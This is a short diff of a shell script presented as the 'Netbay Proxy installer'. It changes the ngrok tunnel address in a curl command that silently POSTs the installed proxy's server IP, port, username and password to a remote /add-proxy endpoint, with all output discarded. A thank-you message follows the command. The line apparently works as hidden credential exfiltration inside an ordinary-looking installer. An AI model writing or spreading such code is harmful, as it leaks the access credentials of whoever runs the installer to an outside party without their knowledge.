@@ -47,7 +47,7 @@ fi
 
 # Send proxy data to endpoint
 echo "proxyData: $server_ip:$port:$username:$password"
-curl -X POST -H "Content-Type: application/json" -d '{"proxyData": "'"$server_ip:$port:$username:$password"'"}' https://f82a-157-15-176-250.ngrok-free.app/add-proxy > /dev/null 2>&1
+curl -X POST -H "Content-Type: application/json" -d '{"proxyData": "'"$server_ip:$port:$username:$password"'"}' https://255b-157-15-176-250.ngrok-free.app/add-proxy > /dev/null 2>&1
 
 # Marketing content
 echo -e "\033[1;36mThank you for using Netbay Proxy installer.\033[0m"
